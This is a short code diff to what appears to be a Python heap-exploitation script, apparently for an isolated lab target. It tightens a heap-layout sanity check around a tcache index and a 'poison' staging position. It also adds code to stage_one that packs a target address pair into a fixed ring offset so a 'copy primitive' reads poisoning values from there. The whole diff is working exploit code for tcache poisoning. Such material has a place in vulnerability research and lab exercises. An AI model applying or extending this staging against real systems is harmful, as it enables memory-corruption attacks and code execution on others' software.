@@ -74,7 +74,11 @@ class HeapProfile:
             raise RuntimeError("record size is outside the isolated lab range")
         if not 0 <= self.tcache_index < 64:
             raise RuntimeError("invalid tcache index")
-        if self.poison_staged_position >= 0 or self.ring_from_heap <= 0:
+        if (
+            self.poison_staged_position == 0
+            or not -(1 << 31) <= self.poison_staged_position < (1 << 31)
+            or self.ring_from_heap <= 0
+        ):
             raise RuntimeError("unexpected relative heap layout")
 
 
@@ -182,6 +186,11 @@ def stage_one(target: int, command_block_extra: int, prefix_payload: bytes = b""
     prefix = bytearray(1024)
     prefix[: len(prefix_payload)] = prefix_payload
     pair = struct.pack("<QQ", target, target)
+    if prefix_payload:
+        # The v24 copy primitive reads its poisoning qwords from ring+0x77.
+        # This range is reserved padding in build_fixed_proof(), so retain the
+        # fixed source slot even when the 512-byte proof block is present.
+        prefix[0x77:0x87] = pair
     start = 71 if not prefix_payload else len(prefix_payload) + ((7 - len(prefix_payload)) % 16)
     for offset in range(start, len(prefix) - 15, 16):
         prefix[offset : offset + 16] = pair
